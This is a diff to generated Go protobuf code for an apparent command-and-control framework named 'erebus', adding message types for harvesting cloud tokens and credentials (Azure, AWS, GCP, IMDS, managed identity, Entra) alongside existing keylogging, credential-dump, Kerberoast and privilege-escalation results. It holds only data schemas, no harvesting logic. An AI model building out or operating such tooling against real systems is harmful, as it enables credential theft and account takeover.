@@ -3753,6 +3753,334 @@ func (x *PrivescResult) GetNewPid() uint32 {
 	return 0
 }
 
+type CloudHarvestConfig struct {
+	state         protoimpl.MessageState `protogen:"open.v1"`
+	Provider      string                 `protobuf:"bytes,1,opt,name=provider,proto3" json:"provider,omitempty"` // "azure", "aws", "gcp", "imds", "all"
+	Method        string                 `protobuf:"bytes,2,opt,name=method,proto3" json:"method,omitempty"`     // "cli", "imds", "managed_identity", "adconnect", "entra_token", "creds", "all"
+	unknownFields protoimpl.UnknownFields
+	sizeCache     protoimpl.SizeCache
+}
+
+func (x *CloudHarvestConfig) Reset() {
+	*x = CloudHarvestConfig{}
+	mi := &file_c2_proto_msgTypes[61]
+	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
+	ms.StoreMessageInfo(mi)
+}
+
+func (x *CloudHarvestConfig) String() string {
+	return protoimpl.X.MessageStringOf(x)
+}
+
+func (*CloudHarvestConfig) ProtoMessage() {}
+
+func (x *CloudHarvestConfig) ProtoReflect() protoreflect.Message {
+	mi := &file_c2_proto_msgTypes[61]
+	if x != nil {
+		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
+		if ms.LoadMessageInfo() == nil {
+			ms.StoreMessageInfo(mi)
+		}
+		return ms
+	}
+	return mi.MessageOf(x)
+}
+
+// Deprecated: Use CloudHarvestConfig.ProtoReflect.Descriptor instead.
+func (*CloudHarvestConfig) Descriptor() ([]byte, []int) {
+	return file_c2_proto_rawDescGZIP(), []int{61}
+}
+
+func (x *CloudHarvestConfig) GetProvider() string {
+	if x != nil {
+		return x.Provider
+	}
+	return ""
+}
+
+func (x *CloudHarvestConfig) GetMethod() string {
+	if x != nil {
+		return x.Method
+	}
+	return ""
+}
+
+type CloudHarvestResult struct {
+	state         protoimpl.MessageState `protogen:"open.v1"`
+	Provider      string                 `protobuf:"bytes,1,opt,name=provider,proto3" json:"provider,omitempty"`
+	Method        string                 `protobuf:"bytes,2,opt,name=method,proto3" json:"method,omitempty"`
+	Tokens        []*CloudToken          `protobuf:"bytes,3,rep,name=tokens,proto3" json:"tokens,omitempty"`
+	Credentials   []*CloudCredential     `protobuf:"bytes,4,rep,name=credentials,proto3" json:"credentials,omitempty"`
+	Metadata      string                 `protobuf:"bytes,5,opt,name=metadata,proto3" json:"metadata,omitempty"` // JSON metadata from IMDS
+	Error         string                 `protobuf:"bytes,6,opt,name=error,proto3" json:"error,omitempty"`
+	unknownFields protoimpl.UnknownFields
+	sizeCache     protoimpl.SizeCache
+}
+
+func (x *CloudHarvestResult) Reset() {
+	*x = CloudHarvestResult{}
+	mi := &file_c2_proto_msgTypes[62]
+	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
+	ms.StoreMessageInfo(mi)
+}
+
+func (x *CloudHarvestResult) String() string {
+	return protoimpl.X.MessageStringOf(x)
+}
+
+func (*CloudHarvestResult) ProtoMessage() {}
+
+func (x *CloudHarvestResult) ProtoReflect() protoreflect.Message {
+	mi := &file_c2_proto_msgTypes[62]
+	if x != nil {
+		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
+		if ms.LoadMessageInfo() == nil {
+			ms.StoreMessageInfo(mi)
+		}
+		return ms
+	}
+	return mi.MessageOf(x)
+}
+
+// Deprecated: Use CloudHarvestResult.ProtoReflect.Descriptor instead.
+func (*CloudHarvestResult) Descriptor() ([]byte, []int) {
+	return file_c2_proto_rawDescGZIP(), []int{62}
+}
+
+func (x *CloudHarvestResult) GetProvider() string {
+	if x != nil {
+		return x.Provider
+	}
+	return ""
+}
+
+func (x *CloudHarvestResult) GetMethod() string {
+	if x != nil {
+		return x.Method
+	}
+	return ""
+}
+
+func (x *CloudHarvestResult) GetTokens() []*CloudToken {
+	if x != nil {
+		return x.Tokens
+	}
+	return nil
+}
+
+func (x *CloudHarvestResult) GetCredentials() []*CloudCredential {
+	if x != nil {
+		return x.Credentials
+	}
+	return nil
+}
+
+func (x *CloudHarvestResult) GetMetadata() string {
+	if x != nil {
+		return x.Metadata
+	}
+	return ""
+}
+
+func (x *CloudHarvestResult) GetError() string {
+	if x != nil {
+		return x.Error
+	}
+	return ""
+}
+
+type CloudToken struct {
+	state         protoimpl.MessageState `protogen:"open.v1"`
+	Provider      string                 `protobuf:"bytes,1,opt,name=provider,proto3" json:"provider,omitempty"`
+	TokenType     string                 `protobuf:"bytes,2,opt,name=token_type,json=tokenType,proto3" json:"token_type,omitempty"` // "access_token", "refresh_token", "prt", "managed_identity"
+	AccessToken   string                 `protobuf:"bytes,3,opt,name=access_token,json=accessToken,proto3" json:"access_token,omitempty"`
+	RefreshToken  string                 `protobuf:"bytes,4,opt,name=refresh_token,json=refreshToken,proto3" json:"refresh_token,omitempty"`
+	TenantId      string                 `protobuf:"bytes,5,opt,name=tenant_id,json=tenantId,proto3" json:"tenant_id,omitempty"`
+	ClientId      string                 `protobuf:"bytes,6,opt,name=client_id,json=clientId,proto3" json:"client_id,omitempty"`
+	Resource      string                 `protobuf:"bytes,7,opt,name=resource,proto3" json:"resource,omitempty"`
+	ExpiresAt     int64                  `protobuf:"varint,8,opt,name=expires_at,json=expiresAt,proto3" json:"expires_at,omitempty"`
+	Source        string                 `protobuf:"bytes,9,opt,name=source,proto3" json:"source,omitempty"` // where the token was found
+	unknownFields protoimpl.UnknownFields
+	sizeCache     protoimpl.SizeCache
+}
+
+func (x *CloudToken) Reset() {
+	*x = CloudToken{}
+	mi := &file_c2_proto_msgTypes[63]
+	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
+	ms.StoreMessageInfo(mi)
+}
+
+func (x *CloudToken) String() string {
+	return protoimpl.X.MessageStringOf(x)
+}
+
+func (*CloudToken) ProtoMessage() {}
+
+func (x *CloudToken) ProtoReflect() protoreflect.Message {
+	mi := &file_c2_proto_msgTypes[63]
+	if x != nil {
+		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
+		if ms.LoadMessageInfo() == nil {
+			ms.StoreMessageInfo(mi)
+		}
+		return ms
+	}
+	return mi.MessageOf(x)
+}
+
+// Deprecated: Use CloudToken.ProtoReflect.Descriptor instead.
+func (*CloudToken) Descriptor() ([]byte, []int) {
+	return file_c2_proto_rawDescGZIP(), []int{63}
+}
+
+func (x *CloudToken) GetProvider() string {
+	if x != nil {
+		return x.Provider
+	}
+	return ""
+}
+
+func (x *CloudToken) GetTokenType() string {
+	if x != nil {
+		return x.TokenType
+	}
+	return ""
+}
+
+func (x *CloudToken) GetAccessToken() string {
+	if x != nil {
+		return x.AccessToken
+	}
+	return ""
+}
+
+func (x *CloudToken) GetRefreshToken() string {
+	if x != nil {
+		return x.RefreshToken
+	}
+	return ""
+}
+
+func (x *CloudToken) GetTenantId() string {
+	if x != nil {
+		return x.TenantId
+	}
+	return ""
+}
+
+func (x *CloudToken) GetClientId() string {
+	if x != nil {
+		return x.ClientId
+	}
+	return ""
+}
+
+func (x *CloudToken) GetResource() string {
+	if x != nil {
+		return x.Resource
+	}
+	return ""
+}
+
+func (x *CloudToken) GetExpiresAt() int64 {
+	if x != nil {
+		return x.ExpiresAt
+	}
+	return 0
+}
+
+func (x *CloudToken) GetSource() string {
+	if x != nil {
+		return x.Source
+	}
+	return ""
+}
+
+type CloudCredential struct {
+	state         protoimpl.MessageState `protogen:"open.v1"`
+	Provider      string                 `protobuf:"bytes,1,opt,name=provider,proto3" json:"provider,omitempty"`                 // "azure", "aws", "gcp"
+	CredType      string                 `protobuf:"bytes,2,opt,name=cred_type,json=credType,proto3" json:"cred_type,omitempty"` // "access_key", "service_account", "password", "connection_string"
+	Identity      string                 `protobuf:"bytes,3,opt,name=identity,proto3" json:"identity,omitempty"`                 // username, access_key_id, service account email
+	Secret        string                 `protobuf:"bytes,4,opt,name=secret,proto3" json:"secret,omitempty"`                     // password, secret key, private key
+	Extra         string                 `protobuf:"bytes,5,opt,name=extra,proto3" json:"extra,omitempty"`                       // session token, project id, etc.
+	Source        string                 `protobuf:"bytes,6,opt,name=source,proto3" json:"source,omitempty"`                     // file path or env var where found
+	unknownFields protoimpl.UnknownFields
+	sizeCache     protoimpl.SizeCache
+}
+
+func (x *CloudCredential) Reset() {
+	*x = CloudCredential{}
+	mi := &file_c2_proto_msgTypes[64]
+	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
+	ms.StoreMessageInfo(mi)
+}
+
+func (x *CloudCredential) String() string {
+	return protoimpl.X.MessageStringOf(x)
+}
+
+func (*CloudCredential) ProtoMessage() {}
+
+func (x *CloudCredential) ProtoReflect() protoreflect.Message {
+	mi := &file_c2_proto_msgTypes[64]
+	if x != nil {
+		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
+		if ms.LoadMessageInfo() == nil {
+			ms.StoreMessageInfo(mi)
+		}
+		return ms
+	}
+	return mi.MessageOf(x)
+}
+
+// Deprecated: Use CloudCredential.ProtoReflect.Descriptor instead.
+func (*CloudCredential) Descriptor() ([]byte, []int) {
+	return file_c2_proto_rawDescGZIP(), []int{64}
+}
+
+func (x *CloudCredential) GetProvider() string {
+	if x != nil {
+		return x.Provider
+	}
+	return ""
+}
+
+func (x *CloudCredential) GetCredType() string {
+	if x != nil {
+		return x.CredType
+	}
+	return ""
+}
+
+func (x *CloudCredential) GetIdentity() string {
+	if x != nil {
+		return x.Identity
+	}
+	return ""
+}
+
+func (x *CloudCredential) GetSecret() string {
+	if x != nil {
+		return x.Secret
+	}
+	return ""
+}
+
+func (x *CloudCredential) GetExtra() string {
+	if x != nil {
+		return x.Extra
+	}
+	return ""
+}
+
+func (x *CloudCredential) GetSource() string {
+	if x != nil {
+		return x.Source
+	}
+	return ""
+}
+
 var File_c2_proto protoreflect.FileDescriptor
 
 const file_c2_proto_rawDesc = "" +
@@ -4033,7 +4361,37 @@ const file_c2_proto_rawDesc = "" +
 	"\asuccess\x18\x01 \x01(\bR\asuccess\x12\x16\n" +
 	"\x06method\x18\x02 \x01(\tR\x06method\x12#\n" +
 	"\rnew_integrity\x18\x03 \x01(\tR\fnewIntegrity\x12\x17\n" +
-	"\anew_pid\x18\x04 \x01(\rR\x06newPid*\xdc\x04\n" +
+	"\anew_pid\x18\x04 \x01(\rR\x06newPid\"H\n" +
+	"\x12CloudHarvestConfig\x12\x1a\n" +
+	"\bprovider\x18\x01 \x01(\tR\bprovider\x12\x16\n" +
+	"\x06method\x18\x02 \x01(\tR\x06method\"\xe7\x01\n" +
+	"\x12CloudHarvestResult\x12\x1a\n" +
+	"\bprovider\x18\x01 \x01(\tR\bprovider\x12\x16\n" +
+	"\x06method\x18\x02 \x01(\tR\x06method\x12-\n" +
+	"\x06tokens\x18\x03 \x03(\v2\x15.erebus.c2.CloudTokenR\x06tokens\x12<\n" +
+	"\vcredentials\x18\x04 \x03(\v2\x1a.erebus.c2.CloudCredentialR\vcredentials\x12\x1a\n" +
+	"\bmetadata\x18\x05 \x01(\tR\bmetadata\x12\x14\n" +
+	"\x05error\x18\x06 \x01(\tR\x05error\"\x9c\x02\n" +
+	"\n" +
+	"CloudToken\x12\x1a\n" +
+	"\bprovider\x18\x01 \x01(\tR\bprovider\x12\x1d\n" +
+	"\n" +
+	"token_type\x18\x02 \x01(\tR\ttokenType\x12!\n" +
+	"\faccess_token\x18\x03 \x01(\tR\vaccessToken\x12#\n" +
+	"\rrefresh_token\x18\x04 \x01(\tR\frefreshToken\x12\x1b\n" +
+	"\ttenant_id\x18\x05 \x01(\tR\btenantId\x12\x1b\n" +
+	"\tclient_id\x18\x06 \x01(\tR\bclientId\x12\x1a\n" +
+	"\bresource\x18\a \x01(\tR\bresource\x12\x1d\n" +
+	"\n" +
+	"expires_at\x18\b \x01(\x03R\texpiresAt\x12\x16\n" +
+	"\x06source\x18\t \x01(\tR\x06source\"\xac\x01\n" +
+	"\x0fCloudCredential\x12\x1a\n" +
+	"\bprovider\x18\x01 \x01(\tR\bprovider\x12\x1b\n" +
+	"\tcred_type\x18\x02 \x01(\tR\bcredType\x12\x1a\n" +
+	"\bidentity\x18\x03 \x01(\tR\bidentity\x12\x16\n" +
+	"\x06secret\x18\x04 \x01(\tR\x06secret\x12\x14\n" +
+	"\x05extra\x18\x05 \x01(\tR\x05extra\x12\x16\n" +
+	"\x06source\x18\x06 \x01(\tR\x06source*\xdc\x04\n" +
 	"\bTaskType\x12\x10\n" +
 	"\fTASK_UNKNOWN\x10\x00\x12\x0e\n" +
 	"\n" +
@@ -4081,7 +4439,7 @@ func file_c2_proto_rawDescGZIP() []byte {
 }
 
 var file_c2_proto_enumTypes = make([]protoimpl.EnumInfo, 1)
-var file_c2_proto_msgTypes = make([]protoimpl.MessageInfo, 62)
+var file_c2_proto_msgTypes = make([]protoimpl.MessageInfo, 66)
 var file_c2_proto_goTypes = []any{
 	(TaskType)(0),                // 0: erebus.c2.TaskType
 	(*Register)(nil),             // 1: erebus.c2.Register
@@ -4145,7 +4503,11 @@ var file_c2_proto_goTypes = []any{
 	(*PersistResult)(nil),        // 59: erebus.c2.PersistResult
 	(*PrivescConfig)(nil),        // 60: erebus.c2.PrivescConfig
 	(*PrivescResult)(nil),        // 61: erebus.c2.PrivescResult
-	nil,                          // 62: erebus.c2.LDAPEntry.AttributesEntry
+	(*CloudHarvestConfig)(nil),   // 62: erebus.c2.CloudHarvestConfig
+	(*CloudHarvestResult)(nil),   // 63: erebus.c2.CloudHarvestResult
+	(*CloudToken)(nil),           // 64: erebus.c2.CloudToken
+	(*CloudCredential)(nil),      // 65: erebus.c2.CloudCredential
+	nil,                          // 66: erebus.c2.LDAPEntry.AttributesEntry
 }
 var file_c2_proto_depIdxs = []int32{
 	6,  // 0: erebus.c2.Beacon.results:type_name -> erebus.c2.TaskResult
@@ -4157,17 +4519,19 @@ var file_c2_proto_depIdxs = []int32{
 	24, // 6: erebus.c2.NetIfconfigResult.interfaces:type_name -> erebus.c2.NetInterface
 	27, // 7: erebus.c2.NetPortscanResult.ports:type_name -> erebus.c2.PortResult
 	30, // 8: erebus.c2.LDAPEnumResult.entries:type_name -> erebus.c2.LDAPEntry
-	62, // 9: erebus.c2.LDAPEntry.attributes:type_name -> erebus.c2.LDAPEntry.AttributesEntry
+	66, // 9: erebus.c2.LDAPEntry.attributes:type_name -> erebus.c2.LDAPEntry.AttributesEntry
 	34, // 10: erebus.c2.KerberoastResult.hashes:type_name -> erebus.c2.KerberoastHash
 	37, // 11: erebus.c2.ASREPRoastResult.hashes:type_name -> erebus.c2.ASREPHash
 	40, // 12: erebus.c2.CredDumpResult.credentials:type_name -> erebus.c2.Credential
 	53, // 13: erebus.c2.KeylogDumpResult.entries:type_name -> erebus.c2.KeylogEntry
-	31, // 14: erebus.c2.LDAPEntry.AttributesEntry.value:type_name -> erebus.c2.LDAPValues
-	15, // [15:15] is the sub-list for method output_type
-	15, // [15:15] is the sub-list for method input_type
-	15, // [15:15] is the sub-list for extension type_name
-	15, // [15:15] is the sub-list for extension extendee
-	0,  // [0:15] is the sub-list for field type_name
+	64, // 14: erebus.c2.CloudHarvestResult.tokens:type_name -> erebus.c2.CloudToken
+	65, // 15: erebus.c2.CloudHarvestResult.credentials:type_name -> erebus.c2.CloudCredential
+	31, // 16: erebus.c2.LDAPEntry.AttributesEntry.value:type_name -> erebus.c2.LDAPValues
+	17, // [17:17] is the sub-list for method output_type
+	17, // [17:17] is the sub-list for method input_type
+	17, // [17:17] is the sub-list for extension type_name
+	17, // [17:17] is the sub-list for extension extendee
+	0,  // [0:17] is the sub-list for field type_name
 }
 
 func init() { file_c2_proto_init() }
@@ -4181,7 +4545,7 @@ func file_c2_proto_init() {
 			GoPackagePath: reflect.TypeOf(x{}).PkgPath(),
 			RawDescriptor: unsafe.Slice(unsafe.StringData(file_c2_proto_rawDesc), len(file_c2_proto_rawDesc)),
 			NumEnums:      1,
-			NumMessages:   62,
+			NumMessages:   66,
 			NumExtensions: 0,
 			NumServices:   0,
 		},
